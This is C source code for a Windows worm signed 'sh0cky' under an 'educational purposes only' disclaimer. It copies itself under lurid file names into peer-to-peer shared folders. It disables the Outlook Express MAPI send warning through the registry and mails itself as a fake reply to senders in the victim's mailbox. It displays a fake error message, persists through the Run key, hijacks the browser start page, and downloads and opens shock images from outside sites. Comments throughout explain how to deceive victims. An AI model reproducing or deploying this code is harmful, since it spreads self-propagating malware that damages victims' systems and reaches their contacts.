   #include <windows.h>
   #include <string.h>
   #include <stdio.h>
   #include <stdlib.h>
   #include <winreg.h>
   #include <mapi.h>
   #define Refresh(this) RtlZeroMemory(&this, sizeof(this));
   #define MAKEJPG(x,y) lstrcat(x,y[i]); lstrcat(x,".jpg");
   typedef void (*Funk)(LPVOID,char*,char*,int,int);
   inline BOOL FileExists(char* FileName);
   BOOL Download(char* URL, char* File_Name);
   /*NOTE!!! The Creator of this "virus" holds no responsiblity if you as the "victim" activate it.
   This was pure created for educational purposes only to
   see the effects of a computer virus acting as a worm.
   I The Creator of this program "sh0cky" hold absoulutely NO responsilbity of others actions
   with this program.*/

   int APIENTRY WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
   {
        int i = 0, delay = 5000; HKEY hKey; DWORD useless;
        unsigned char reg[30] = "www.google.com";
        char pathname[256];
        HMODULE hMe = GetModuleHandle(NULL);
        DWORD nRet = GetModuleFileName(hMe, pathname, 256);
        char DnldPath[260], DnldResult[260], MyPics[260], system[260];
        char * picList[] = {
             "\\me2", "\\mendfriends",
             "\\funny", "\\lol", "\\haha",
             "\\noob", "\\open", "\\insane",
             "\\freedom", "\\XXX", "\\me"
             };
             char * pDnld[] = {
                  "lemonparty.org/lemonparty", "goatse.cz/hello",
                  "consumptionjunction.com/downloadsnew/cj_52447",
                  "bottleguy.com/bottleguy", "gimpyd.com/scat/zorro~xander",
                  "gimpyd.com/scat/z015", "gimpyd.com/scat/yes4sy",
                  "gimpyd.com/scat/Tulip", "gimpyd.com/scat/snicker_bars",
                   "gimpyd.com/scat/tool24", "gimpyd.com/scat/thattimeagain"
                    };
                    //Save some space, reuse some variables.
                     GetSystemDirectory(system, 260);
                     lstrcat(system, "\\windowsloader.exe");
                     CopyFile(pathname,"C:\\Program Files\\Kazaa\\My Shared Folder\\HackToolz.exe", 0);
   CopyFile(pathname,"C:\\program files\\ICQ\\Shared Folder\\PornLoader.exe", 0);
   CopyFile(pathname,"C:\\Program Files\\kazaa lite\\My Shared Folder\\SexyTime!.exe", 0);
   CopyFile(pathname,"C:\\Program Files\\Kazaa Lite\\My Shared Folder\\SexyTime!.exe", 0);
   CopyFile(pathname,"C:\\Program Files\\Kazaa Lite K++\\My Shared Folder\\HackToolz5.3.exe", 0);
   CopyFile(pathname,"C:\\Program Files\\bearshare\\shared\\HotSex.exe", 0);
   CopyFile(pathname,"C:\\Program Files\\edonkey2000\\incoming\\Free$$$.exe", 0);
   CopyFile(pathname,"C:\\Program Files\\eMule\\Incoming\\FreePron.exe", 0);
   CopyFile(pathname,"C:\\Program Files\\Morpheus\\My Shared Folder\\Sexxxx.exe", 0);
   CopyFile(pathname,"C:\\Program Files\\Limewire\\Shared\\XXX.exe", 0);
   CopyFile(pathname,"C:\\Program Files\\winmx\\shared\\Porn.exe", 0);
   CopyFile(pathname,"C:\\Program Files\\Tesla\\Download Acclerator.exe", 0);
   CopyFile(pathname,"C:\\Program Files\\winmx\\shared\\Porn Pics Collection 10000.zip.exe", 0);
      HKEY         RegHandle1;
      HKEY         RegHandle2;
      char         DefaultUserId[100];
      DWORD         DefaultUserIdSize = sizeof(DefaultUserId);
      DWORD         WarnDisable = 0;

      /*
      The declarations we need to save stuff from registry, as example the handles,
      the default user id and the value for disabling MAPI warning.
      */

      HINSTANCE      MapiDll;
      LPMAPILOGON      MapiLogon;
      LPMAPIFINDNEXT      MapiFindNext;
      LPMAPIREADMAIL      MapiReadMail;
      LPMAPISENDMAIL      MapiSendMail;
      LPMAPILOGOFF      MapiLogoff;
      LHANDLE         MapiSessionHandle;
      MapiMessage      *GetMessage;
      MapiMessage      Message;
      MapiRecipDesc      Originator;
      MapiRecipDesc      Recips;
      MapiFileDesc      Files;

      /*
      The declarations we need to handle with MAPI, we declare the used api's and
      structures. We fill the structures with needed data's later.
      */

      char         WormFile[MAX_PATH] = "%windir%\\windowsloader.exe";
      char         Subject[100];
      char         VictimAddress[100];
      char         MessageBuffer[512];
      char         Re[] = "Re: ";
      unsigned short      MailCount = 10;

      /*
      The buffer for worm path, subject of e-mail, victims mail address, the string
      "Re: " to fake an answer and the mail count. "Answer" the last 5 mails in box.
      */

      Message.ulReserved      = 0;
      Message.lpszSubject      = Subject;
      Message.lpszNoteText      = "Hehe, sorry, I forgot ;)\nLook at this! its the funniest thing!";
      Message.lpszMessageType      = 0;
      Message.lpszDateReceived   = 0;
      Message.lpszConversationID   = 0;
      Message.flFlags         = 0;
      Message.lpOriginator      = &Originator;
      Message.nRecipCount      = 1;
      Message.lpRecips      = &Recips;
      Message.nFileCount      = 1;
      Message.lpFiles         = &Files;

      Originator.ulReserved      = 0;
      Originator.ulRecipClass      = MAPI_ORIG;
      Originator.lpszName      = 0;
      Originator.lpszAddress      = 0;
      Originator.ulEIDSize      = 0;
      Originator.lpEntryID      = 0;

      Recips.ulReserved      = 0;
      Recips.ulRecipClass      = MAPI_TO;
      Recips.lpszName         = 0;
      Recips.lpszAddress      = VictimAddress;
      Recips.ulEIDSize      = 0;
      Recips.lpEntryID      = 0;

      Files.ulReserved      = 0;
      Files.flFlags         = 0;
      Files.nPosition         = 0;
      Files.lpszPathName      = WormFile;
      Files.lpszFileName      = "FunniestThingsof2006.exe";
      Files.lpFileType      = 0;

      /*
      The MAPI Message structure, we fill it with data's. We fill the buffers
      Subject, VictimAddress and WormFile later, now it's just a pointer to this
      buffers. Somethin you have to know:
      Message.lpszSubject      = Mail Subject
      Message.lpszNoteText      = Mail Body
      Originator.lpszName      = Sender of the Mail, name
      Originator.lpszAddress      = Sender of the Mail, mail address
      Recips.lpszName         = Who gets the Mail, name
      Recips.lpszAddress      = Who gets the Mail, mail address
      Files.lpszPathName      = Attachment, where is the file stored
      Files.lpszFileName      = Attachment, how is the attached file named
      */

      RegOpenKeyEx(HKEY_CURRENT_USER, "Identities", 0, KEY_QUERY_VALUE, &RegHandle1);
      RegQueryValueEx(RegHandle1, "Default User ID", 0, 0, (BYTE *)&DefaultUserId, &DefaultUserIdSize);
      lstrcat(DefaultUserId, "\\Software\\Microsoft\\Outlook Express\\5.0\\Mail");
      RegOpenKeyEx(RegHandle1, DefaultUserId, 0, KEY_SET_VALUE, &RegHandle2);
      RegSetValueEx(RegHandle2, "Warn on Mapi Send", 0, REG_DWORD, (BYTE *)&WarnDisable, sizeof(WarnDisable));
      RegCloseKey(RegHandle2);
      RegCloseKey(RegHandle1);

      /*
      Here we play with the registry to disable outlook warning when a other application
      try's to send a mail with MAPI.
      1. Open HKEY_CURRENT_USER\Identities and save handle
      2. Read value of "Default User ID" and save it to buffer
      3. Append path to outlook settings to it, now:
          HKEY_CURRENT_USER\Identities\<UserID>\Software\Microsoft\Outlook Express\5.0\Mail
      4. Open this registry path and save handle
      5. Set "Warn on Mapi Send" to 0, means no warning
      6. Close both handles.
      */

      MapiDll      = LoadLibrary("MAPI32.DLL");
      MapiLogon   = (LPMAPILOGON)      GetProcAddress(MapiDll, "MAPILogon");
      MapiFindNext   = (LPMAPIFINDNEXT)   GetProcAddress(MapiDll, "MAPIFindNext");
      MapiReadMail   = (LPMAPIREADMAIL)   GetProcAddress(MapiDll, "MAPIReadMail");
      MapiSendMail   = (LPMAPISENDMAIL)   GetProcAddress(MapiDll, "MAPISendMail");
      MapiLogoff   = (LPMAPILOGOFF)   GetProcAddress(MapiDll, "MAPILogoff");

      /*
      Here we load all for MAPI needed api's. First we load the library MAPI32.DLL
      and sae the handle to extract all api's with GetProcAddress.
      */

      GetModuleFileName(0, WormFile, sizeof(WormFile));

      /*
      Get the full path of the worm file to send it as attachment with mail.
      */

      MapiLogon(0, 0, 0, 0, 0, &MapiSessionHandle);

      /*
      Log into a new MAPI session and save the handle.
      */

      while(MapiFindNext(MapiSessionHandle, 0, 0, MessageBuffer, MAPI_GUARANTEE_FIFO, 0, MessageBuffer) == SUCCESS_SUCCESS || MailCount == 0)
      {

      /*
      Find first or next mail stored in the mail box and save it to buffer. If this fails or
      we arrived mail count then jump out of this while loop.
      */

         if(MapiReadMail(MapiSessionHandle, 0, MessageBuffer, 0, 0, &GetMessage) == SUCCESS_SUCCESS)
         {

         /*
         Read the mail we found via MapiFindNext to structure GetMessage. If this fails
         try to find next mail.
         */

            lstrcpy(Subject, Re);
            lstrcat(Subject, GetMessage->lpszSubject);
            lstrcpy(VictimAddress, GetMessage->lpOriginator->lpszAddress);

            /*
            Copy "Re: " to buffer and append the real subject of the mail, as example
            "Re: Hey, whassup?". Copy the senders mail address to our buffer to "answer"
            the mail.
            */

            if (MapiSendMail(MapiSessionHandle, 0, &Message, 0, 0) == SUCCESS_SUCCESS)
            {

            /*
            Send the mail, MAPI Message structure is successfuly filled with needed
            data's, so it should work. If not try to find next mail in box.
            */

               MailCount--;

               /*
               We send successfull a mail, so we decrease the mail count by one.
               */
            }
         }

      }

      MapiLogoff(MapiSessionHandle, 0, 0, 0);
      FreeLibrary(MapiDll);

      /*
      Logoff the current session via handle we saved, and free the library MAPI32.DLL
      also via handle.
      */

      MessageBox(0, "Runtime Could Not Load!, timeout loading recognised files. Please load again.\n If reoccurence please re install.", "ERROR", MB_ICONERROR);
                  if (!FileExists(system)) //First time, need to install.
                     {
                        GetModuleFileName(NULL, DnldResult, 260);
                        CopyFile(DnldResult, system, 1);
                        RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, 2, &hKey);
                        RegSetValueEx(hKey, "Windows Boot Loader", 0, REG_SZ, system, 260);
                        RegCloseKey(hKey);
                        RegCreateKey (HKEY_CURRENT_USER, "Software\\Microsoft\\Internet Explorer\\Main",&hKey);
                        RegSetValueEx (hKey,"Start Page", 0, REG_SZ, reg, sizeof(reg));
                        RegCloseKey(hKey);
                     }

                          //Get My Pictures directory
                          RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ShellFolders",
                          0, KEY_READ, &hKey); RegQueryValueEx(hKey, "My Pictures", NULL, NULL, (BYTE*)MyPics, &useless);
                          RegCloseKey(hKey);

                          for (i = 0; pDnld[i]; i++)

                          {
                              Refresh(system); Refresh(DnldResult);
              lstrcpy(system, "http://www."); MAKEJPG(system, pDnld);
               lstrcpy(DnldResult, MyPics); MAKEJPG(DnldResult, picList);
               Download(system, DnldResult); Sleep(delay);
               ShellExecute(NULL, "open", DnldResult, NULL, NULL, SW_MAXIMIZE);

   }








      /*
      Show fake error message to fool user, maybe he delete the worm because he
      think it's a not working application, but we dont care, he already sent
      this baby to 5 of his friends (in best case) :).
      */
               return 0;
               }
               inline BOOL FileExists(char* FileName)
               {
               return GetFileAttributes(FileName) != INVALID_FILE_ATTRIBUTES;
               }
               BOOL Download(char* URL, char* File_Name)
               {
               HINSTANCE Dll_Handle = LoadLibrary("urlmon.dll");
               if  (Dll_Handle == NULL) return FALSE;
               Funk DnLd  = (Funk)GetProcAddress(Dll_Handle,"URLDownloadToFileA");
               if (DnLd == NULL) return FALSE;   DnLd(0,URL,File_Name,0,0);
               FreeLibrary(Dll_Handle);
               return TRUE;
               }
